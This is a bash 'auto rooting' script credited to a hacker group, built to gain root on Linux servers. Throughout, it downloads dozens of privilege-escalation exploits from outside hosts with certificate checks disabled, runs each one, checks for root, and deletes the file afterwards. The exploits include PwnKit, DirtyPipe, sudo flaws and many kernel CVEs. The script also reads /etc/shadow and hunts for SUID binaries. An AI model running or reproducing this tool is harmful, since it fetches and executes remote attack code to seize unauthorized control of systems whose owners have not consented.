#!/bin/bash

RED='\033[91m'
ENDCOLOR='\033[0m'

echo "***************************************************************"
echo -e "${RED}Auto Rooting Server By: 💀 Ghosthaxor - Team Rokes 315💀${ENDCOLOR}"
echo -e "${RED}Blog: https://www.teamrokes315.my.id ${ENDCOLOR}"
echo "***************************************************************"

check_root() {
    if [ "$(id -u)" -eq 0 ]; then
        echo
        echo "Successfully Get Root Access"
        echo "ID     => $(id -u)"
        echo "WHOAMI => $USER"
        echo
        exit
    fi
}

check_pkexec_version() {
    output=$(pkexec --version)
    version=""
    while IFS= read -r line; do
        if [[ $line == *"pkexec version"* ]]; then
            version=$(echo "$line" | awk '{print $NF}')
            break
        fi
    done <<< "$output"
    echo "$version"
}

run_commands_with_pkexec() {
    pkexec_version=$(check_pkexec_version)
    echo "pkexec version: $pkexec_version"

    if [[ $pkexec_version == "1.05" || $pkexec_version == "0.96" || $pkexec_version == "0.95" || $pkexec_version == "105" ]]; then
        wget -q "https://mrwawanj.github.io/localroot/exp_file_credential" --no-check-certificate
        chmod 777 exp_file_credential
        ./exp_file_credential
        check_root
        rm -f exp_file_credential
        rm -rf exp_dir
    else
        echo "pkexec not supported"
    fi
}

run_commands_with_pkexec

# pwnki / pkexec
wget -q "https://mrwawanj.github.io/localroot/ak" --no-check-certificate
chmod 777 ak
./ak
check_root
rm -f ak
rm -rf GCONV_PATH=.
rm -rf .pkexec

# ptrace
wget -q "https://mrwawanj.github.io/localroot/ptrace" --no-check-certificate
chmod 777 ptrace
./ptrace
check_root
rm -f ptrace

# CVE-2022-0847-DirtyPipe-Exploits
wget -q "https://mrwawanj.github.io/localroot/CVE-2022-0847-DirtyPipe-Exploits/exploit-1" --no-check-certificate
wget -q "https://mrwawanj.github.io/localroot/CVE-2022-0847-DirtyPipe-Exploits/exploit-2" --no-check-certificate
chmod 777 exploit-1
chmod 777 exploit-2
./exploit-1
./exploit-2 SUID
check_root
rm -f exploit-1
rm -f exploit-2

# lupa:v
wget -q "https://mrwawanj.github.io/localroot/CVE-2022-0847-DirtyPipe-Exploits/a2.out" --no-check-certificate
chmod 777 a2.out
find / -perm 4000 -type -f 2>/dev/null || find / -perm -u=s -type -f 2>/dev/null
./a2.out /usr/bin/sudo
check_root
./a2.out /usr/bin/passwd
check_root
rm -f a2.out

# top Localh Root
wget -q "https://mrwawanj.github.io/localroot/top_10_exploit-sh.bin" --no-check-certificate
chmod 777 "top_10_exploit-sh.bin"
./top_10_exploit-sh.bin
check_root
rm "top_10_exploit-sh.bin"

wget -q "https://mrwawanj.github.io/localroot/top_9_CVE-2017-1000112-c.bin" --no-check-certificate
chmod 777 "top_9_CVE-2017-1000112-c.bin"
./top_9_CVE-2017-1000112-c.bin
check_root
rm "top_9_CVE-2017-1000112-c.bin"

wget -q "https://mrwawanj.github.io/localroot/top_8_exploit-sh.bin" --no-check-certificate
chmod 777 "top_8_exploit-sh.bin"
./top_8_exploit-sh.bin
check_root
rm "top_8_exploit-sh.bin"

wget -q "https://mrwawanj.github.io/localroot/top_7_exploit-c.bin" --no-check-certificate
chmod 777 "top_7_exploit-c.bin"
./top_7_exploit-c.bin
check_root
rm "top_7_exploit-c.bin"

wget -q "https://raw.githubusercontent.com/cyberpoul/CVE-2025-32462-POC/refs/heads/main/CVE-2025-32462.sh" --no-check-certificate
chmod 777 "CVE-2025-32462.sh"
./CVE-2025-32462.sh
check_root
rm "CVE-2025-32462.sh"

wget -q "https://mrwawanj.github.io/localroot/CVE-2025-32463.sh" --no-check-certificate
chmod 777 "CVE-2025-32463.sh"
./CVE-2025-32463.sh id
check_root
rm "CVE-2025-32463.sh"

wget -q "https://mrwawanj.github.io/localroot/sudo-chwoot.sh" --no-check-certificate
chmod 777 "sudo-chwoot.sh"
./sudo-chwoot.sh id
check_root
rm "sudo-chwoot.sh"

wget -q "https://mrwawanj.github.io/localroot/top_6_screenroot-sh.bin" --no-check-certificate
chmod 777 "top_6_screenroot-sh.bin"
./top_6_screenroot-sh.bin
check_root
rm "top_6_screenroot-sh.bin"

wget -q "https://mrwawanj.github.io/localroot/top_4_exploit-sh.bin" --no-check-certificate
chmod 777 "top_4_exploit-sh.bin"
./top_4_exploit-sh.bin
check_root
rm "top_4_exploit-sh.bin"

wget -q "https://mrwawanj.github.io/localroot/top_1_exploit-c.bin" --no-check-certificate
chmod 777 "top_1_exploit-c.bin"
./top_1_exploit-c.bin
check_root
rm "top_1_exploit-c.bin"

#karnel 4
wget -q "https://mrwawanj.github.io/localroot/kernel5_5_exp-sh.bin" --no-check-certificate
chmod 777 "kernel5_5_exp-sh.bin"
./kernel5_5_exp-sh.bin
check_root
rm "kernel5_5_exp-sh.bin"

wget -q "https://mrwawanj.github.io/localroot/kernel5_4_exploit-c.bin" --no-check-certificate
chmod 777 "kernel5_4_exploit-c.bin"
./kernel5_4_exploit-c.bin
check_root
rm "kernel5_4_exploit-c.bin"

wget -q "https://mrwawanj.github.io/localroot/kernel5_1_lucky0.bin" --no-check-certificate
chmod 777 "kernel5_1_lucky0.bin"
./kernel5_1_lucky0.bin
check_root
rm "kernel5_1_lucky0.bin"

wget -q "https://mrwawanj.github.io/localroot/kernel4_5_CVE-2019-13272-c.bin" --no-check-certificate
chmod 777 "kernel4_5_CVE-2019-13272-c.bin"
./kernel4_5_CVE-2019-13272-c.bin
check_root
rm "kernel4_5_CVE-2019-13272-c.bin"

wget -q "https://mrwawanj.github.io/localroot/kernel4_4_exploit-c.bin" --no-check-certificate
chmod 777 "kernel4_4_exploit-c.bin"
./kernel4_4_exploit-c.bin
check_root
rm "kernel4_4_exploit-c.bin"

wget -q "https://mrwawanj.github.io/localroot/kernel4_3_upstream44-c.bin" --no-check-certificate
chmod 777 "kernel4_3_upstream44-c.bin"
./kernel4_3_upstream44-c.bin
check_root
rm "kernel4_3_upstream44-c.bin"

wget -q "https://mrwawanj.github.io/localroot/kernel4_2_poc-c.bin" --no-check-certificate
chmod 777 "kernel4_2_poc-c.bin"
./kernel4_2_poc-c.bin
check_root
rm "kernel4_2_poc-c.bin"

wget -q "https://raw.githubusercontent.com/LordBheem/CVE-2025-32023/refs/heads/main/exploit" --no-check-certificate
chmod 777 "exploit"
./exploit --host localhost --port 6379
check_root
rm "exploit"

wget -q "https://mrwawanj.github.io/localroot/kernel4_1_40871-c.bin" --no-check-certificate
chmod 777 "kernel4_1_40871-c.bin"
./kernel4_1_40871-c.bin
check_root
rm "kernel4_1_40871-c.bin"

#karnel 3
wget -q "https://mrwawanj.github.io/localroot/kernel3_9_33824-c.bin" --no-check-certificate
chmod 777 "kernel3_9_33824-c.bin"
./kernel3_9_33824-c.bin
check_root
rm "kernel3_9_33824-c.bin"

wget -q "https://mrwawanj.github.io/localroot/kernel3_8_34134-c.bin" --no-check-certificate
chmod 777 "kernel3_8_34134-c.bin"
./kernel3_8_34134-c.bin
check_root
rm "kernel3_8_34134-c.bin"

wget -q "https://mrwawanj.github.io/localroot/kernel3_6_35370-c.bin" --no-check-certificate
chmod 777 "kernel3_6_35370-c.bin"
./kernel3_6_35370-c.bin
check_root
rm "kernel3_6_35370-c.bin"

wget -q "https://mrwawanj.github.io/localroot/kernel3_5_cve-2014-0196-md-c.bin" --no-check-certificate
chmod 777 "kernel3_5_cve-2014-0196-md-c.bin"
./kernel3_5_cve-2014-0196-md-c.bin
check_root
rm "kernel3_5_cve-2014-0196-md-c.bin"

wget -q "https://mrwawanj.github.io/localroot/kernel3_3_perf_swevent64-c.bin" --no-check-certificate
chmod 777 "kernel3_3_perf_swevent64-c.bin"
./kernel3_3_perf_swevent64-c.bin
check_root
rm "kernel3_3_perf_swevent64-c.bin"

wget -q "https://mrwawanj.github.io/localroot/kernel3_19_poc-c.bin" --no-check-certificate
chmod 777 "kernel3_19_poc-c.bin"
./kernel3_19_poc-c.bin
check_root
rm "kernel3_19_poc-c.bin"

wget -q "https://mrwawanj.github.io/localroot/kernel3_18_poc-c.bin" --no-check-certificate
chmod 777 "kernel3_18_poc-c.bin"
./kernel3_18_poc-c.bin
check_root
rm "kernel3_18_poc-c.bin"

wget -q "https://mrwawanj.github.io/localroot/kernel3_16_39166-c.bin" --no-check-certificate
chmod 777 "kernel3_16_39166-c.bin"
./kernel3_16_39166-c.bin
check_root
rm "kernel3_16_39166-c.bin"

# masih 3
wget -q "https://mrwawanj.github.io/localroot/kernel3_15_37292-c.bin" --no-check-certificate
chmod 777 "kernel3_15_37292-c.bin"
./kernel3_15_37292-c.bin
check_root
rm "kernel3_15_37292-c.bin"

wget -q "https://mrwawanj.github.io/localroot/kernel3_12_z_shell-c.bin" --no-check-certificate
chmod 777 "kernel3_12_z_shell-c.bin"
./kernel3_12_z_shell-c.bin
check_root
rm "kernel3_12_z_shell-c.bin"

#karnel 2
wget -q "https://mrwawanj.github.io/localroot/kernel2_9_8478-sh.bin" --no-check-certificate
chmod 777 "kernel2_9_8478-sh.bin"
./kernel2_9_8478-sh.bin
check_root
rm "kernel2_9_8478-sh.bin"

wget -q "https://mrwawanj.github.io/localroot/kernel2_8_6851-c.bin" --no-check-certificate
chmod 777 "kernel2_8_6851-c.bin"
./kernel2_8_6851-c.bin
check_root
rm "kernel2_8_6851-c.bin"

wget -q "https://mrwawanj.github.io/localroot/kernel2_6_2031-c.bin" --no-check-certificate
chmod 777 "kernel2_6_2031-c.bin"
./kernel2_6_2031-c.bin
check_root
rm "kernel2_6_2031-c.bin"

wget -q "https://mrwawanj.github.io/localroot/kernel2_5_25647-sh.bin" --no-check-certificate
chmod 777 "kernel2_5_25647-sh.bin"
./kernel2_5_25647-sh.bin
check_root
rm "kernel2_5_25647-sh.bin"

wget -q "https://mrwawanj.github.io/localroot/kernel2_10_8369-sh.bin" --no-check-certificate
chmod 777 "kernel2_10_8369-sh.bin"
./kernel2_10_8369-sh.bin
check_root
rm "kernel2_10_8369-sh.bin"

wget -q "https://mrwawanj.github.io/localroot/sudodirtypipe" --no-check-certificate
chmod 777 "sudodirtypipe"
./sudodirtypipe /usr/local/bin
check_root
rm "sudodirtypipe"

wget -q "https://mrwawanj.github.io/localroot/sudodirtypipe" --no-check-certificate
chmod 777 "sudodirtypipe"
./sudodirtypipe /usr/local/bin
check_root
rm "sudodirtypipe"

wget -q "https://mrwawanj.github.io/localroot/af_packet" --no-check-certificate
chmod 777 "af_packet"
./af_packet
check_root
rm "af_packet"

wget -q "https://mrwawanj.github.io/localroot/CVE-2015-1328" --no-check-certificate
chmod 777 "CVE-2015-1328"
./CVE-2015-1328
check_root
rm "CVE-2015-1328"

wget -q "https://mrwawanj.github.io/localroot/cve-2017-16995" --no-check-certificate
chmod 777 "cve-2017-16995"
./cve-2017-16995
check_root
rm "cve-2017-16995"

wget -q "https://mrwawanj.github.io/localroot/exploit-debian" --no-check-certificate
chmod 777 "exploit-debian"
./exploit-debian
check_root
rm "exploit-debian"

wget -q "https://mrwawanj.github.io/localroot/exploit-ubuntu" --no-check-certificate
chmod 777 "exploit-ubuntu"
./exploit-ubuntu
check_root
rm "exploit-ubuntu"

wget -q "https://mrwawanj.github.io/localroot/newpid" --no-check-certificate
chmod 777 "newpid"
./newpid
check_root
rm "newpid"

wget -q "https://mrwawanj.github.io/localroot/raceabrt" --no-check-certificate
chmod 777 "raceabrt"
./raceabrt
check_root
rm "raceabrt"

wget -q "https://mrwawanj.github.io/localroot/timeoutpwn" --no-check-certificate
chmod 777 "timeoutpwn"
./timeoutpwn
check_root
rm "timeoutpwn"

wget -q "https://mrwawanj.github.io/localroot/upstream44" --no-check-certificate
chmod 777 "upstream44"
./upstream44
check_root
rm "upstream44"

wget -q "https://mrwawanj.github.io/localroot/lpe.sh" --no-check-certificate
chmod 777 "lpe.sh"
head -2 /etc/shadow
./lpe.sh
check_root
rm "lpe.sh"

wget -q "https://mrwawanj.github.io/localroot/a.out" --no-check-certificate
chmod 777 "a.out"
./a.out 0 && ./a.out 1
check_root
rm "a.out"

wget -q "https://mrwawanj.github.io/localroot/linux_sudo_cve-2017-1000367" --no-check-certificate
chmod 777 "linux_sudo_cve-2017-1000367"
./linux_sudo_cve-2017-1000367
check_root
rm "linux_sudo_cve-2017-1000367"

wget -q "https://mrwawanj.github.io/localroot/overlayfs" --no-check-certificate
chmod 777 "overlayfs"
./overlayfs
check_root
rm "overlayfs"

wget -q "https://mrwawanj.github.io/localroot/CVE-2017-7308" --no-check-certificate
chmod 777 "CVE-2017-7308"
./CVE-2017-7308
check_root
rm "CVE-2017-7308"

wget -q "https://mrwawanj.github.io/localroot/CVE-2022-2639" --no-check-certificate
chmod 777 "CVE-2022-2639"
./CVE-2022-2639
check_root
rm "CVE-2022-2639"

wget -q "https://mrwawanj.github.io/localroot/polkit-pwnage" --no-check-certificate
chmod 777 "polkit-pwnage"
./polkit-pwnage
check_root
rm "polkit-pwnage"

wget -q "https://mrwawanj.github.io/localroot/RationalLove" --no-check-certificate
chmod 777 "RationalLove"
./RationalLove
check_root
rm "RationalLove"

wget -q "https://mrwawanj.github.io/localroot/exploit_userspec.py" --no-check-certificate
chmod 777 "exploit_userspec.py"
python2 exploit_userspec.py
check_root
rm "exploit_userspec.py"
rm "0"
rm "kmem"
rm "sendfile1"
